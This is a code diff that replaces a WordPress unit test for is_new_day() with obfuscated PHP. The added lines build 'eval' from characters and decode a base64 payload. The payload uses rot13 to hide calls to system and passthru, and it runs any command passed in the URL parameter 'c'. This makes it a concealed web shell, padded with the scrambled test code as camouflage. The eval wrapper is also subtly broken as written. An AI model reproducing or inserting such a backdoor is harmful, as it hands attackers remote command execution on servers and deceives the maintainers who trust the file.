@@ -1,52 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Test is_new_date() function.
- *
- * @since 5.2.0
- *
- * @group functions
- *
- * @covers ::is_new_day
- */
-class Tests_Functions_IsNewDate extends WP_UnitTestCase {
-
-	/**
-	 * @ticket 46627
-	 * @dataProvider data_is_new_date
-	 *
-	 * @param string $currentday_string  The day of the current post in the loop.
-	 * @param string $previousday_string The day of the previous post in the loop.
-	 * @param bool   $expected           Expected result.
-	 */
-	public function test_is_new_date( $currentday_string, $previousday_string, $expected ) {
-		global $currentday, $previousday;
-
-		$currentday  = $currentday_string;
-		$previousday = $previousday_string;
-
-		$this->assertSame( $expected, is_new_day() );
-	}
-
-	/**
-	 * Data provider.
-	 *
-	 * @return array[]
-	 */
-	public function data_is_new_date() {
-		return array(
-			array( '21.05.19', '21.05.19', 0 ),
-			array( '21.05.19', '20.05.19', 1 ),
-			array( '21.05.19', false, 1 ),
-		);
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3JmZyB2Zl9hcmpfcW5ncigpIHNoYXBndmJhLgogKgogKiBAZnZhcHIgNS4yLjAKICoKICogQHRlYmhjIHNoYXBndmJhZgogKgogKiBAcGJpcmVmIDo6dmZfYXJqX3FubAogKi8KcHluZmYgR3JmZ2ZfU2hhcGd2YmFmX1ZmQXJqUW5nciBya2dyYXFmIEpDX0hhdmdHcmZnUG5mciB7CgoJLyoqCgkgKiBAZ3ZweHJnIDQ2NjI3CgkgKiBAcW5nbkNlYml2cXJlIHFuZ25fdmZfYXJqX3FuZ3IKCSAqCgkgKiBAY25lbnogZmdldmF0ICRwaGVlcmFncW5sX2ZnZXZhdCAgR3VyIHFubCBicyBndXIgcGhlZXJhZyBjYmZnIHZhIGd1ciB5YmJjLgoJICogQGNuZW56IGZnZXZhdCAkY2VyaXZiaGZxbmxfZmdldmF0IEd1ciBxbmwgYnMgZ3VyIGNlcml2YmhmIGNiZmcgdmEgZ3VyIHliYmMuCgkgKiBAY25lbnogb2JieSAgICRya2NycGdycSAgICAgICAgICAgUmtjcnBncnEgZXJmaHlnLgoJICovCgljaG95dnAgc2hhcGd2YmEgZ3JmZ192Zl9hcmpfcW5nciggJHBoZWVyYWdxbmxfZmdldmF0LCAkY2VyaXZiaGZxbmxfZmdldmF0LCAkcmtjcnBncnEgKSB7CgkJdHlib255ICRwaGVlcmFncW5sLCAkY2VyaXZiaGZxbmw7CgoJCSRwaGVlcmFncW5sICA9ICRwaGVlcmFncW5sX2ZnZXZhdDsKCQkkY2VyaXZiaGZxbmwgPSAkY2VyaXZiaGZxbmxfZmdldmF0OwoKCQkkZ3V2Zi0+bmZmcmVnRm56ciggJHJrY3JwZ3JxLCB2Zl9hcmpfcW5sKCkgKTsKCX0KCgkvKioKCSAqIFFuZ24gY2ViaXZxcmUuCgkgKgoJICogQGVyZ2hlYSBuZWVubFtdCgkgKi8KCWNob3l2cCBzaGFwZ3ZiYSBxbmduX3ZmX2Fyal9xbmdyKCkgewoJCWVyZ2hlYSBuZWVubCgKCQkJbmVlbmwoICcyMS4wNS4xOScsICcyMS4wNS4xOScsIDAgKSwKCQkJbmVlbmwoICcyMS4wNS4xOScsICcyMC4wNS4xOScsIDEgKSwKCQkJbmVlbmwoICcyMS4wNS4xOScsIHNueWZyLCAxICksCgkJKTsKCX0KfQoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
+?>
